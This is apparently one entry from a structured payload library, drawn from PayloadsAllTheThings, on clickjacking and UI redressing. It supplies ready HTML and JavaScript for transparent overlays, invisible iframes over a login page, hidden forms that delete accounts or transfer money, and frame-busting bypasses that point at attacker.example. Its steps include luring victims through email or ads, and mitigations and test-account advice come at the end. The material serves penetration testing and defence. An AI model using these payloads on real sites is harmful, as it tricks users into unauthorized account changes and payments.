{"id": "payload_000013", "important": {"title": "Clickjacking / UI Redressing", "category": "UI Manipulation", "sub_category": "Clickjacking", "tags": ["clickjacking", "ui-redressing", "iframe", "onbeforeunload", "x-frame-options", "csp"], "targets": {"os": ["Any"], "system": ["Web App", "Browser", "Admin Panels"]}, "risk": "high"}, "variants": [{"match": {"os": ["Any"], "system": ["UI Redressing / Overlay"]}, "payload": {"explanation": "Transparent overlay that places hidden actionable elements over a visible UI to trick clicks.", "code": "<div style=\"opacity:0; position:absolute; top:0; left:0; height:100%; width:100%;\">\n  <a href=\"https://attacker.example/trigger-action\">Click me</a>\n</div>", "run_context": "Host on attacker page; lure victim to attacker page while legitimate site is framed under overlay.", "placeholders": {"ATTACKER_URL": "https://attacker.example/trigger-action"}, "notes": "Requires target page to be framable (no X-Frame-Options/CSP frame-ancestors)."}}, {"match": {"os": ["Any"], "system": ["Invisible iframe"]}, "payload": {"explanation": "Invisible iframe loads target site; overlay or button interaction triggers hidden iframe action.", "code": "<iframe src=\"https://legitimate-site.com/login\" style=\"opacity:0; height:0; width:0; border:none;\"></iframe>", "run_context": "Attacker page embedding the legit site in an invisible iframe.", "placeholders": {"TARGET": "https://legitimate-site.com/login"}, "notes": "If cookies/session scope permit, clicking overlaid controls can perform actions on the framed site."}}, {"match": {"os": ["Any"], "system": ["Button/Form Hijacking"]}, "payload": {"explanation": "Hidden form submitted when victim clicks visible element — causes unauthorized action on another origin.", "code": "<button onclick=\"document.getElementById('h').submit()\">Click me</button>\n<form id=\"h\" action=\"https://legitimate-site.com/account/delete\" method=\"POST\" style=\"display:none;\">\n  <input type=\"hidden\" name=\"confirm\" value=\"1\">\n</form>", "run_context": "Attacker page: place visible bait over hidden form area or rely on framing.", "placeholders": {"TARGET_ACTION": "https://legitimate-site.com/account/delete"}, "notes": "Works when target site accepts state-changing actions without CSRF protections."}}, {"match": {"os": ["Any"], "system": ["OnBeforeUnload anti-bust bypass"]}, "payload": {"explanation": "Use onbeforeunload and repeated navigation to prevent frame-busting code from breaking the iframe.", "code": "/* Attacker page */\nwindow.onbeforeunload = function(){ return 'Do you want to leave?'; };\nsetInterval(function(){ window.top.location = 'http://attacker.example/204.php'; }, 1);", "run_context": "Attacker top-level page that contains framed target site.", "placeholders": {"ATTACKER_204_PAGE": "http://attacker.example/204.php"}, "notes": "Requires ability to host attacker pages and rely on browser's unload prompts; behavior varies across browsers."}}, {"match": {"os": ["Any"], "system": ["XSS Filter / Frame-bust bypass"]}, "payload": {"explanation": "Bypass frame-busting by injecting fragments of frame-bust script into parameters to disable it via XSS filters.", "code": "<iframe src=\"http://target/?param=<script>if\" style=\"opacity:0\"></iframe>", "run_context": "Attack requires injection point where payload fragments neutralize frame-bust code (IE/Chrome historical filters).", "placeholders": {"TARGET_INJECTION": "http://target/?param=<injection>"}, "notes": "Technique depends on browser's XSS filter quirks; modern browsers may not be vulnerable."}}], "usage": {"steps": ["Identify whether target page can be framed (absence of X-Frame-Options or CSP frame-ancestors).", "Choose technique: overlay, invisible iframe, or hidden form based on target interaction and action to trigger.", "Craft attacker page that positions transparent overlay or invisible iframe aligned with visible bait elements.", "Host the attacker page and lure victim to open it (social engineering, email, ad, etc.).", "Verify action: reproduce click triggers desired action on target (use test accounts and safe endpoints).", "Capture PoC (request/response pairs, screenshot showing overlay) and recommend countermeasures."], "tools": ["Burp Suite — for testing injection points and framing behavior", "ZAP — proxy and testing", "Browser devtools — to craft and test CSS/iframe overlays", "machine1337/clickjack — tooling for automated PoCs"], "required_params": {"target_url": {"required": true, "example": "https://legitimate-site.com/login"}, "action_to_trigger": {"required": true, "example": "POST /account/delete"}}, "code_samples": [{"title": "UI Redressing Overlay Example", "description": "Transparent overlay that covers full viewport with hidden clickable element.", "code": "<div style=\"opacity:0; position:absolute; top:0; left:0; height:100%; width:100%;\">\n  <a href=\"https://legitimate-site.com/delete?action=1\">Click me</a>\n</div>", "placeholders": {"LEGIT_ACTION": "https://legitimate-site.com/delete?action=1"}, "run_context": "browser"}, {"title": "Invisible iframe + button hijack PoC", "description": "Embed target in invisible iframe and link visible button to change iframe location (challenge example).", "code": "<div style=\"position: absolute; opacity: 0;\">\n  <iframe src=\"https://legitimate-site.com/login\" width=\"500\" height=\"500\"></iframe>\n</div>\n<button onclick=\"document.getElementsByTagName('iframe')[0].contentWindow.location='http://malicious-site.com';\">Click me</button>", "placeholders": {"TARGET": "https://legitimate-site.com/login", "MALICIOUS": "http://malicious-site.com"}, "run_context": "browser", "notes": "Challenge case: clicking button causes iframe navigation to attacker site under victim's click context."}, {"title": "Hidden-form Submission PoC", "description": "Submit hidden form to perform state-changing action on target site.", "code": "<form id=\"h\" action=\"https://legitimate-site.com/transfer\" method=\"POST\" style=\"display:none;\">\n  <input name=\"amount\" value=\"1000\">\n</form>\n<button onclick=\"document.getElementById('h').submit()\">Pay</button>", "placeholders": {"TARGET_ACTION": "https://legitimate-site.com/transfer"}, "run_context": "browser"}], "mitigations": ["Set X-Frame-Options: DENY or SAMEORIGIN on responses to prevent framing.", "Use Content-Security-Policy frame-ancestors 'self' (or explicit allowed domains).", "Implement CSRF tokens and verify Origin/Referer for state-changing requests.", "Avoid relying solely on JavaScript frame-busting (can be disabled or bypassed).", "Use 'X-Frame-Options' and CSP consistently across all subdomains and assets.", "Educate users and provide warnings when sensitive actions are possible."], "references": ["OWASP Clickjacking Cheat Sheet", "PortSwigger - Clickjacking", "machine1337/clickjack"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
